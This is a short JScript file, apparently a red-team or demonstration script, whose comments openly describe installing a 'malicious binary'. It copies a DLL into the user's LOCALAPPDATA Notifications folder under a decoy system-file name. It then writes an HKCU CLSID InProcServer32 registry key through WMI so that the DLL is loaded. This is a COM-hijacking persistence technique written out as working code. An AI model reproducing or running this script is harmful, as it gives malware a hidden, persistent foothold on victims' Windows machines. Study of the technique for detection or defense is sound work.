// Get the path to our malicious binary
var fso = new ActiveXObject("Scripting.FileSystemObject");
var sourceFileName = fso.GetAbsolutePathName(".") + "\\" + "nothing-to-see-here.dll";

// Get the path to where we want to copy our malicious binary to
var sh = new ActiveXObject("WScript.Shell");
var oEnvVars = sh.Environment("Process");
var localAppData = oEnvVars("LOCALAPPDATA");
var destinationFileName = localAppData + "\\Microsoft\\Windows\\Notifications\\wpndatabase0.db-shm";

// copy our COM class DLL to the destination
fso.CopyFile(sourceFileName, destinationFileName, true);

// Get an instance of StdRegProv, which is the COM class we use to write to the registry
var wbemLoc = new ActiveXObject('WbemScripting.SWbemLocator');
var wbemSrv = wbemLoc.ConnectServer(null, 'root\\default');
var stdRegProv = wbemSrv.Get('StdRegProv');

// Create the key
var ocrp = stdRegProv.Methods_("CreateKey").Inparameters;
ocrp.Hdefkey= 0x80000001; // HKCU
var s = "SOFTWARE\\Classes\\CLSID\\{4655840e-ab1a-49d0-a4c4-261fa1c20e86}\\InProcServer32\\";
ocrp.Ssubkeyname = s;
stdRegProv.ExecMethod_("CreateKey", ocrp)

// Write the key value (path to our binary)
var oInParams = stdRegProv.Methods_("SetStringValue").Inparameters;
oInParams.Hdefkey = 0x80000001; // HKCU
oInParams.Ssubkeyname = s;
oInParams.Svaluename = "";
oInParams.SValue = destinationFileName;
stdRegProv.ExecMethod_("SetStringValue", oInParams, 0);

